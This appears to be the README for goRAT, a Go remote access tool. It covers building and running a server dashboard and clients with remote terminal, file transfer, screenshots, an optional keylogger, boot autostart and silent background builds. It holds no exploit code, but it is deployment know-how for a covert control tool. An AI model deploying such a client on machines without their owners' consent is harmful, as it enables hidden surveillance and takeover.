# goRAT - Remote Access Tool Server & Client

A powerful, feature-rich Remote Access Tool (RAT) built in Go with real-time client management, WebSocket communication, file transfer, terminal access, screenshot capture, and comprehensive web-based control panel.

## 📋 Table of Contents

- [Features](#features)
- [Architecture](#architecture)
- [System Requirements](#system-requirements)
- [Installation](#installation)
- [Quick Start](#quick-start)
- [Configuration](#configuration)
- [Web Dashboard](#web-dashboard)
- [API Endpoints](#api-endpoints)
- [Command Line Usage](#command-line-usage)
- [Database](#database)
- [Security](#security)
- [Troubleshooting](#troubleshooting)

---

## ✨ Features

### Server
- **WebSocket-based Communication** - Real-time bidirectional client-server communication
- **Multi-Client Management** - Handle multiple connected clients simultaneously
- **Web Dashboard** - Modern, responsive web-based control panel with real-time updates
- **User Management** - Multi-user support with role-based access control (admin/operator/viewer)
- **Database Persistence** - SQLite backend for clients, proxies, and user data
- **Terminal Proxy** - Remote terminal access to connected clients
- **Session Management** - Secure session-based authentication with cookie support
- **Graceful Shutdown** - Clean startup/stop/restart/status commands

### Client
- **Auto-Connection** - Automatically reconnects on connection loss
- **File Browser** - Browse, upload, and download files from remote machines
- **Terminal Access** - Execute commands and interact with remote terminal
- **Screenshot Capture** - Take real-time screenshots of remote systems
- **System Information** - Gather OS details, process lists, and system stats
- **Keylogger** (Windows/Linux) - Optional keystroke logging capability
- **Auto-Start** - Configure automatic startup on system boot
- **Daemon Mode** - Run as background service/daemon
- **Update System** - Push updates to clients from server
- **Proxy Tunneling** - Create local proxy tunnels to remote ports
- **Silent Mode** - Release builds run with zero console output

---

## 🏗️ Architecture

### System Overview
```
┌─────────────────────────────────────────────────────────────┐
│                      Web Browser                             │
│                  (Dashboard / Control Panel)                 │
└────────────────────────┬────────────────────────────────────┘
                         │ HTTPS/HTTP
┌────────────────────────▼────────────────────────────────────┐
│                    Web Server (nginx)                        │
│                 (TLS Termination)                            │
└────────────────────────┬────────────────────────────────────┘
                         │ HTTP
┌────────────────────────▼────────────────────────────────────┐
│                   goRAT Server                               │
│  ┌──────────────────────────────────────────────────────┐   │
│  │ WebSocket Handler     │ REST API Handler             │   │
│  │ Client Manager        │ Terminal Proxy               │   │
│  │ Session Manager       │ File Operations              │   │
│  └──────────────────────────────────────────────────────┘   │
│                         │                                    │
│                    SQLite DB                                 │
│  ┌──────────────────────────────────────────────────────┐   │
│  │ Clients Table  │ Proxies Table  │ Web Users Table    │   │
│  └──────────────────────────────────────────────────────┘   │
└────────────────┬───────────────────────────────────────────┘
                 │ WebSocket (wss://)
    ┌────────────┼────────────┬──────────────┐
    │            │            │              │
┌───▼──┐    ┌───▼──┐    ┌───▼──┐    ┌───▼──┐
│ RAT  │    │ RAT  │    │ RAT  │    │ RAT  │
│Client│    │Client│    │Client│    │Client│
└──────┘    └──────┘    └──────┘    └──────┘
 Linux      Windows       macOS      Linux
```

### Component Architecture

**Server Components:**
- `ClientManager` - Manages active client connections
- `ClientStore` - SQLite persistence layer
- `WebHandler` - HTTP request handling and web UI routing
- `ProxyManager` - Manages proxy tunnel connections
- `TerminalProxy` - Remote terminal session management
- `SessionManager` - User session handling with cookie-based auth

**Client Components:**
- `CommandExecutor` - Command execution and process management
- `FileBrowser` - File system operations
- `ScreenshotCapture` - Screen capture and image encoding
- `TerminalManager` - Interactive terminal sessions
- `Keylogger` - Keystroke logging (platform-specific)
- `Updater` - Client update management
- `InstanceManager` - Single instance enforcement and lifecycle control

---

## 🖥️ System Requirements

### Server Requirements
- **OS**: Linux, Windows, or macOS
- **Go**: 1.18 or higher (for building from source)
- **RAM**: Minimum 256MB (recommended 512MB)
- **Storage**: Minimum 100MB free disk space
- **Network**: Outbound HTTPS for client connections

### Client Requirements
- **OS**: Windows, Linux, or macOS
- **Go**: 1.18 or higher (for building from source)
- **RAM**: Minimal footprint, ~50MB per instance
- **Network**: Reliable connection to server (auto-reconnect on failure)

### Optional Dependencies
- **nginx**: For TLS termination and reverse proxy (recommended for production)
- **Screenshots**: Linux requires X11 or Wayland support

---

## 📦 Installation

### From Source

1. **Clone the repository:**
   ```bash
   git clone https://github.com/vsteng/goRAT.git
   cd goRAT
   ```

2. **Build the server:**
   ```bash
   go build -o bin/server ./cmd/server
   ```

3. **Build the client (release - silent):**
   ```bash
   go build -o bin/client ./cmd/client
   ```

4. **Build the client (debug - verbose):**
   ```bash
   go build -tags debug -o bin/client-debug ./cmd/client
   ```

5. **Build minimal client:**
   ```bash
   go build -o bin/client-minimal ./cmd/client-minimal
   ```

### Using Make

```bash
# Build all binaries
make build

# Build server only
make build-server

# Build client only
make build-client

# Clean build artifacts
make clean
```

---

## 🚀 Quick Start

### 1. Start the Server

**Basic startup (HTTP behind nginx):**
```bash
./bin/server -addr :8080 -web-user admin -web-pass yourpassword
```

**With TLS enabled:**
```bash
./bin/server -addr :443 -tls -cert /path/to/cert.pem -key /path/to/key.pem
```

**Available options:**
```bash
./bin/server -h
```

### 2. Access Web Dashboard

Open your browser and navigate to:
```
http://localhost:8080/login
```

Default credentials:
- **Username**: admin
- **Password**: yourpassword (or value of `-web-pass` flag)

### 3. Connect a Client

**On the client machine:**
```bash
./bin/client -server wss://your-server.com/ws
```

**Options:**
- `-server`: Server WebSocket URL (required, must include `/ws` path)
- `-daemon`: Run as background service (default: true for release builds)
- `-autostart`: Enable auto-start on boot (default: true)

**Example with all options:**
```bash
./bin/client -server wss://control.example.com/ws -daemon=false -autostart=true
```

### 4. Manage Server Process

```bash
# Check server status
./bin/server status

# Stop server
./bin/server stop

# Restart server
./bin/server restart

# Start server (default)
./bin/server start
```

### 5. Manage Client Process

```bash
# Check client status
./bin/client status

# Stop client
./bin/client stop

# Restart client
./bin/client restart
```

---

## ⚙️ Configuration

### Server Configuration

All settings are passed via command-line flags:

```bash
./bin/server \
  -addr :8080 \
  -cert /etc/ssl/certs/server.crt \
  -key /etc/ssl/private/server.key \
  -tls \
  -web-user admin \
  -web-pass securepassword
```

**Configuration Reference:**

| Flag | Default | Description |
|------|---------|-------------|
| `-addr` | `:8080` | Server listen address and port |
| `-cert` | `""` | Path to TLS certificate file |
| `-key` | `""` | Path to TLS private key file |
| `-tls` | `false` | Enable TLS (set true for HTTPS) |
| `-web-user` | `admin` | Web UI username |
| `-web-pass` | `admin` | Web UI password |

### Client Configuration

**Command-line flags:**

```bash
./bin/client \
  -server wss://control.example.com/ws \
  -daemon=false \
  -autostart=true
```

**Configuration Reference:**

| Flag | Default (Release) | Default (Debug) | Description |
|------|-----------------|-----------------|-------------|
| `-server` | `wss://localhost/ws` | `wss://localhost/ws` | Server WebSocket URL |
| `-daemon` | `true` | `false` | Run as background daemon |
| `-autostart` | `true` | `true` | Enable auto-start on boot |

**Environment Variables:**

- `SERVER_URL`: Override default server URL if not specified via `-server` flag
- `CLIENT_ENABLE_LOG`: Set to `1` or `true` to enable logging in release builds

### Database

The server uses SQLite for persistence. Database file location:
```
./clients.db
```

The database automatically creates tables on first run:
- `clients` - Connected client information
- `proxies` - Proxy tunnel configurations
- `web_users` - User accounts and authentication

---

## 🌐 Web Dashboard

### Overview

The web dashboard provides real-time management of connected clients with:

- **Dashboard** - Overview with statistics (online clients, proxies, users)
- **Clients** - View all connected clients with filter options (all/online/offline)
- **Proxy Management** - Create and manage proxy tunnels
- **Users** - Add/edit/delete user accounts and manage roles
- **Terminal** - Interactive terminal access to client systems
- **File Manager** - Browse and transfer files

### User Roles

| Role | Permissions |
|------|-------------|
| `admin` | Full access to all features and user management |
| `operator` | Access to clients, terminal, files, and proxies |
| `viewer` | Read-only access to view clients and statistics |

### Managing Users

1. Navigate to **Users** section in dashboard
2. Click **+ Add User** button
3. Fill in:
   - **Username** - Unique username for login
   - **Password** - Minimum 6 characters
   - **Full Name** - Display name
   - **Role** - admin, operator, or viewer

4. To disable/enable users: Click the 🔒/🔓 icon in the Actions column
5. To delete users: Click the 🗑️ icon (requires confirmation)

### Session Management

- Sessions expire after 24 hours of inactivity
- Secure cookies with HttpOnly flag
- Logout clears session immediately

---

## 🔌 API Endpoints

### Authentication

```http
POST /api/login
Content-Type: application/json

{
  "username": "admin",
  "password": "password"
}

Response: 200 OK
{
  "status": "success"
}
```

```http
POST /api/logout
Response: 200 OK
```

### Clients

```http
GET /api/clients
Response: 200 OK
[
  {
    "id": "machine-id-1",
    "hostname": "workstation-01",
    "os": "windows",
    "status": "online",
    "connected_at": "2025-12-08T10:30:00Z",
    "last_seen": "2025-12-08T11:45:00Z"
  },
  ...
]
```

### Proxies

```http
GET /api/proxies?clientId=machine-id-1
Response: 200 OK
[
  {
    "id": "proxy-1",
    "client_id": "machine-id-1",
    "local_port": 3306,
    "remote_host": "192.168.1.100",
    "remote_port": 3306,
    "protocol": "tcp",
    "status": "active"
  },
  ...
]

POST /api/proxies
Content-Type: application/json

{
  "client_id": "machine-id-1",
  "local_port": 3306,
  "remote_host": "localhost",
  "remote_port": 3306,
  "protocol": "tcp"
}

POST /api/proxy/close
Content-Type: application/json

{
  "proxy_id": "proxy-1",
  "client_id": "machine-id-1"
}
```

### Users

```http
GET /api/users
Response: 200 OK
[
  {
    "id": 1,
    "username": "admin",
    "full_name": "Administrator",
    "role": "admin",
    "status": "active",
    "created_at": "2025-12-08T10:00:00Z",
    "last_login": "2025-12-08T11:45:00Z"
  },
  ...
]

POST /api/users
Content-Type: application/json

{
  "username": "newuser",
  "password": "securepass123",
  "full_name": "New User",
  "role": "operator"
}

PUT /api/users/{username}
Content-Type: application/json

{
  "status": "inactive",
  "role": "viewer",
  "full_name": "Updated Name"
}

DELETE /api/users/{username}
```

### Terminal

```http
GET /ws?client={clientId}&session={sessionId}

WebSocket protocol for interactive terminal sessions
Messages: {"type":"input","data":"command text"}
```

---

## 💻 Command Line Usage

### Server Commands

```bash
# Start server (default command)
./bin/server

# Check if server is running
./bin/server status

# Stop running server
./bin/server stop

# Restart server
./bin/server restart

# Start with help
./bin/server -h
```

### Client Commands

```bash
# Start client (default command)
./bin/client -server wss://control.example.com/ws

# Check if client is running
./bin/client status

# Stop running client
./bin/client stop

# Restart client
./bin/client restart

# Start in foreground (debug)
./bin/client-debug -server wss://control.example.com/ws -daemon=false
```

---

## 📊 Database

### Database File

Location: `./clients.db` (SQLite)

### Tables Schema

**clients:**
```sql
CREATE TABLE clients (
  id TEXT PRIMARY KEY,
  hostname TEXT,
  username TEXT,
  os TEXT,
  arch TEXT,
  status TEXT,
  connected_at DATETIME,
  last_seen DATETIME,
  metadata TEXT
);
```

**proxies:**
```sql
CREATE TABLE proxies (
  id TEXT PRIMARY KEY,
  client_id TEXT,
  local_port INTEGER,
  remote_host TEXT,
  remote_port INTEGER,
  protocol TEXT,
  status TEXT,
  created_at DATETIME,
  updated_at DATETIME,
  FOREIGN KEY(client_id) REFERENCES clients(id)
);
```

**web_users:**
```sql
CREATE TABLE web_users (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  username TEXT UNIQUE NOT NULL,
  password_hash TEXT NOT NULL,
  full_name TEXT,
  role TEXT DEFAULT 'user',
  status TEXT DEFAULT 'active',
  created_at DATETIME,
  updated_at DATETIME,
  last_login DATETIME
);
```

### Database Backup

```bash
# Backup database
cp clients.db clients.db.backup

# Restore from backup
cp clients.db.backup clients.db
```

---

## 🔒 Security

### Best Practices

1. **Use TLS in Production**
   - Always use HTTPS with valid certificates
   - Enable `-tls` flag with proper certificates
   - Use nginx reverse proxy for TLS termination

2. **Strong Credentials**
   - Use strong, unique passwords for web UI (minimum 8 characters)
   - Change default username and password
   - Rotate passwords regularly

3. **Firewall Rules**
   - Restrict server port to trusted networks
   - Use network-level access controls
   - Monitor connection logs

4. **Database Security**
   - Restrict file permissions on `clients.db`
   - Back up database regularly
   - Keep database on encrypted storage

5. **Client Communication**
   - Always use `wss://` (WebSocket Secure) in production
   - Verify server certificates on clients
   - Keep clients updated

### Authentication

- **Server-to-Client**: Machine ID-based authentication
- **Web UI**: Username/password with session cookies
- **Passwords**: SHA256 hashing with hex encoding
- **Sessions**: 24-hour expiration, secure HttpOnly cookies

---

## 🐛 Troubleshooting

### Server Issues

**Server fails to start:**
```bash
# Check if port is already in use
lsof -i :8080  # macOS/Linux
netstat -ano | findstr :8080  # Windows

# Try different port
./bin/server -addr :9090
```

**TLS certificate errors:**
```bash
# Verify certificate and key match
openssl x509 -noout -modulus -in cert.pem | openssl md5
openssl rsa -noout -modulus -in key.pem | openssl md5

# Generate self-signed certificate for testing
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
```

**Database errors:**
```bash
# Delete corrupted database (warning: loses all data)
rm clients.db

# Server will recreate on next start
```

### Client Issues

**Client fails to connect:**
```bash
# Verify server URL format
# Correct: wss://server.com/ws
# Wrong:  wss://server.com

# Check firewall/network
ping server.com
curl -v wss://server.com/ws

# Use debug build for logs
./bin/client-debug -server wss://server.com/ws -daemon=false
```

**Client doesn't appear in dashboard:**
```bash
# Check client is running
./bin/client status

# Verify server is accepting connections
./bin/server status

# Check client logs (debug build)
./bin/client-debug -server wss://server.com/ws -daemon=false 2>&1 | head -20
```

**Screenshot/file transfer issues:**
```bash
# Check client permissions
ls -la /proc/[pid]/fd  # Linux
# or
ps aux | grep client   # Find PID

# Verify file paths
ls -la /target/file/path

# Use debug build for detailed logs
```

### Web Dashboard Issues

**Can't login:**
- Verify credentials are correct
- Check browser cookies are enabled
- Clear browser cache and cookies
- Try different browser

**Clients show offline:**
- Verify client process is running: `./bin/client status`
- Check network connectivity from client to server
- Review firewall rules
- Check server logs for errors

**Proxy tunnels not working:**
- Verify remote host and port are correct
- Check client system can reach remote host
- Verify local port is not already in use
- Use `netstat` to confirm port is listening

---

## 📝 License

This project is licensed under the MIT License - see LICENSE file for details.

---

## 🤝 Contributing

Contributions are welcome! Please follow these guidelines:

1. Fork the repository
2. Create a feature branch (`git checkout -b feature/amazing-feature`)
3. Commit your changes (`git commit -m 'Add amazing feature'`)
4. Push to the branch (`git push origin feature/amazing-feature`)
5. Open a Pull Request

---

## 📞 Support

For issues and questions:

1. Check the Troubleshooting section above
2. Review existing GitHub issues
3. Create a new issue with:
   - System information (OS, Go version)
   - Error messages or logs
   - Steps to reproduce
   - Expected vs actual behavior

---

## ⚠️ Disclaimer

This tool is provided for authorized security testing and administrative purposes only. Unauthorized access to computer systems is illegal. Users are responsible for obtaining proper authorization before using this tool on any system they do not own or have explicit permission to access.

---

**Last Updated**: December 8, 2025  
**Version**: 1.0.0
